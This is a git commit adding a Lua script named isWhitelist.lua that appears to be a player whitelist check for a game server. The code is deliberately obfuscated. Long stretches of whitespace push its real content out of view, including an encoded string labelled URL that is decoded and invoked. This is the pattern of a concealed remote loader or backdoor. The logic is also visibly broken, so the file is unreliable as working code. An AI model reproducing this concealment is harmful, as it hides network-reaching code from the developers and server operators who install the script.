28e23752814ddb7cd3cf468d488f01d88cbfcd85
Krixx <161109688+Krixx-XD@users.noreply.github.com>
2024-11-07 14:12:45 +0500

    Create isWhitelist.lua

---
+++ isWhitelist.lua
@@ -0,0 +1,33 @@
+--Obfuscated by R@G3
+q={};
+q["w"] = _G
+q["O"] = q["w"]["string"]
+q["I"] = q['O']['byte']
+q['r'] = nil
+local N = q
+
+if N['O'] == q['r'] then
+  (function()
+      return 11111111111111111111111111111111111111
+    end)()
+end
+
+                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                    if(nil)==(N['r']) then end
+                                                                                                                                                   
+                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                    
+                                                                                                                                                    local function whiteListed()end local function blackListed()end
+                                                                                                                                                                                                                                   
+                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                    
+                                                                                                                                                                        local URL=[[d2'de22""@E"/'2e2/'?"@/'d?@"d/"@/'?@?"2/E@/'D?"\/'2ED?2d|"2\'d\2d?@d/2de2/'?@?"D??RT"???WX?""?WE"?"RD$?"r?F"]]                                                         URL = q['I'](URL,-1)                                                               local player={}                                                                                                                          if(player==whiteListed())then URL.check().player.canAccess() end     if player==blackListed() then return end                          
